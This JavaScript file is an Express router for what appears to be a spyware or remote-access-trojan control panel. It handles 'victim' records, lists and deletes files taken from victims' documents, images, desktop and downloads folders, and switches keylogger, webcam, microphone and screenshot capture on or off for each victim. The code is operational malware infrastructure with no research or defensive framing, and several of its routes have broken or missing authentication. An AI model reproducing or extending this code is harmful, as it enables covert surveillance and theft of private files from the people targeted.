const express = require("express");
const database = require("../../database/index");
const bcryptjs = require("bcryptjs")
const router = express.Router();

const auth = async (req, res, next) => {

    if (req.session.name == null && req.session.password == null) {
        res.redirect("/login")

    } else {
        const admin = await database.collection("admin").where("name", "==", req.session.name).where("password", "==", req.session.password).get()

        if(admin.empty){
            res.redirect("/login")
        }

    }

    return next();

}

const auth_v2 = async (req, res, next) =>{

    if(req.session.name == null && req.session.password == null){
        res.send("0")
        return
    }else{
        const admin = await database.collection("admin").where("name", "==", req.session.name).where("password", "==", req.session.password).get()

        if(admin.empty){
            res.send("0")
            return
        }
    }
    return next()
}

router.get("/:id", auth, async (req, res) => {

    const doc = await database.collection("users").doc(req.params.id).get()
    const victim = {
        id: doc.id,
        ...doc.data()
    }

    res.render("victim/index", {
        title: "Victim",
        style: "victim/index",
        victim
    })

})

//Load the data of the date 
router.post("/documents", auth_v2, async (req, res) =>{
    const vicitims = await database.collection("users").doc(req.body.id).collection("data").doc("storage").collection("documents").doc("files").listCollections()
    const data_vicitims = vicitims.map((doc) =>({ id: doc.id}))
    res.send(data_vicitims)
})

router.post("/images", auth_v2, async (req, res) =>{
    const vicitims = await database.collection("users").doc(req.body.id).collection("data").doc("storage").collection("images").doc("files").listCollections()
    const data_vicitims = vicitims.map((doc) =>({ id: doc.id}))
    res.send(data_vicitims)
})

router.post("/music", auth_v2, async (req, res) =>{
    const vicitims = await database.collection("users").doc(req.body.id).collection("data").doc("storage").collection("music").doc("files").listCollections()
    const data_vicitims = vicitims.map((doc) =>({ id: doc.id}))
    res.send(data_vicitims)
})

router.post("/videos", auth_v2, async (req, res) =>{
    const vicitims = await database.collection("users").doc(req.body.id).collection("data").doc("storage").collection("videos").doc("files").listCollections()
    const data_vicitims = vicitims.map((doc) =>({ id: doc.id}))
    res.send(data_vicitims)
})

router.post("/desktop", auth_v2, async (req, res) =>{
    const vicitims = await database.collection("users").doc(req.body.id).collection("data").doc("storage").collection("desktop").doc("files").listCollections()
    const data_vicitims = vicitims.map((doc) =>({ id: doc.id}))
    res.send(data_vicitims)
})

router.post("/downloads", auth_v2, async (req, res) =>{
    const vicitims = await database.collection("users").doc(req.body.id).collection("data").doc("storage").collection("downloads").doc("files").listCollections()
    const data_vicitims = vicitims.map((doc) =>({ id: doc.id}))
    res.send(data_vicitims)
})
//Load the data of the date 


//Delete date
router.delete("/:id/documents", auth_v2, async (req, res) =>{

    const collection = await database.collection("users").doc(req.params.id).collection("data").doc("storage").collection("documents").doc("files").collection(req.body.date).get()

    collection.forEach(doc =>{

        database.collection("users").doc(req.params.id).collection("data").doc("storage").collection("documents").doc("files").collection(req.body.date).doc(doc.id).delete()
    
    })

    res.send("1")

})

router.delete("/:id/images", auth_v2, async (req, res) =>{

    const collection = await database.collection("users").doc(req.params.id).collection("data").doc("storage").collection("images").doc("files").collection(req.body.date).get()

    collection.forEach(doc =>{

        database.collection("users").doc(req.params.id).collection("data").doc("storage").collection("images").doc("files").collection(req.body.date).doc(doc.id).delete()
    
    })

    res.send("1")

})


router.delete("/:id/music", auth_v2, async (req, res) =>{

    const collection = await database.collection("users").doc(req.params.id).collection("data").doc("storage").collection("music").doc("files").collection(req.body.date).get()

    collection.forEach(doc =>{

        database.collection("users").doc(req.params.id).collection("data").doc("storage").collection("music").doc("files").collection(req.body.date).doc(doc.id).delete()
    
    })

    res.send("1")

})

router.delete("/:id/videos", auth_v2, async (req, res) =>{

    const collection = await database.collection("users").doc(req.params.id).collection("data").doc("storage").collection("videos").doc("files").collection(req.body.date).get()

    collection.forEach(doc =>{

        database.collection("users").doc(req.params.id).collection("data").doc("storage").collection("videos").doc("files").collection(req.body.date).doc(doc.id).delete()
    
    })

    res.send("1")

})

router.delete("/:id/desktop", auth_v2, async (req, res) =>{

    const collection = await database.collection("users").doc(req.params.id).collection("data").doc("storage").collection("desktop").doc("files").collection(req.body.date).get()

    collection.forEach(doc =>{

        database.collection("users").doc(req.params.id).collection("data").doc("storage").collection("desktop").doc("files").collection(req.body.date).doc(doc.id).delete()
    
    })

    res.send("1")

})

router.delete("/:id/downloads", auth_v2, async (req, res) =>{

    const collection = await database.collection("users").doc(req.params.id).collection("data").doc("storage").collection("downloads").doc("files").collection(req.body.date).get()

    collection.forEach(doc =>{

        database.collection("users").doc(req.params.id).collection("data").doc("storage").collection("downloads").doc("files").collection(req.body.date).doc(doc.id).delete()
    
    })

    res.send("1")

})
//Delete date

//Edit the name of document
router.put("/edit", (req, res) =>{

    try {

        const document ={
            name: req.body.name,
            date: req.body.fecha,
            size: req.body.size
        }

        database.collection("users").doc(req.body.id).collection("data").doc("storage").collection("documents").doc("files").collection(req.body.date).doc(req.body.uid).update(document)

        res.send("1")

    } catch (error) {
        res.send("0")
    
    }
})
//Edit the name of document

//Change the status of the victim
router.put("/:id", (req, res) => {

    // 0 = sin autenticar
    // 1 = fallo el cambio
    // 2 = si se logro el cambio

    if (req.body.update != null) {

        try {

            if (req.body.update == "true") {
                req.body.update = true
            } else {
                req.body.update = false
            }

            database.collection("users").doc(req.params.id).update(req.body);
            res.send("2")

        } catch (error) {

            res.send("1")

        }

    } else if (req.body.files != null) {

        try {

            if (req.body.files == "true") {
                req.body.files = true
            } else {
                req.body.files = false
            }

            database.collection("users").doc(req.params.id).update(req.body);

            res.send("2")

        } catch (error) {

            res.send("1")

        }


    } else if (req.body.screenshots != null) {

        try {

            if (req.body.screenshots == "true") {
                req.body.screenshots = true
            } else {
                req.body.screenshots = false
            }

            database.collection("users").doc(req.params.id).update(req.body);

            res.send("2")

        } catch (error) {

            res.send("1")

        }


    } else if (req.body.microphone != null) {

        try {
            if (req.body.microphone == "true") {
                req.body.microphone = true
            } else {
                req.body.microphone = false
            }

            database.collection("users").doc(req.params.id).update(req.body);

            res.send("2")

        } catch (error) {

            res.send("1")

        }


    } else if (req.body.webcam != null) {

        try {
            if (req.body.webcam == "true") {
                req.body.webcam = true
            } else {
                req.body.webcam = false
            }

            database.collection("users").doc(req.params.id).update(req.body);

            res.send("2")

        } catch (error) {

            res.send("1")

        }

    } else if (req.body.keylogger != null) {

        try {
            if (req.body.keylogger == "true") {
                req.body.keylogger = true
            } else {
                req.body.keylogger = false
            }

            database.collection("users").doc(req.params.id).update(req.body);

            res.send("2")

        } catch (error) {
            
            res.send("1")
            
        }

    }

});
//Change the status of the victim

//Get the data about the documents
router.get("/:id/documents/:date/files", async (req, res) =>{

    const doc = await database.collection("users").doc(req.params.id).get()
    const victim = {
        id: doc.id,
        ...doc.data()
    }

    res.render("victim/documents",{
        title: "Documents",
        style: "victim/documents",
        victim,
        date: req.params.date
    })
})
//Get the data about the documents

//Load the date of the document
router.post("/documents/date/files", async (req, res) =>{
    
    const get_date = await database.collection("users").doc(req.body.id).collection("data").doc("storage").collection("documents").doc("files").collection(req.body.date).get()
    const date = get_date.docs.map((doc) =>({ id: doc.id, ...doc.data() }))

    res.send(date)
})
//Load the date of the document

//Delete the document
router.delete("/delete", (req, res) =>{

    try {

        database.collection("users").doc(req.body.id).collection("data").doc("storage").collection("documents").doc("files").collection(req.body.date).doc(req.body.uid).delete()

        res.send("1")
        
    } catch (error) {
        res.send("0")
    }
    
})
//Delete the document

module.exports = router;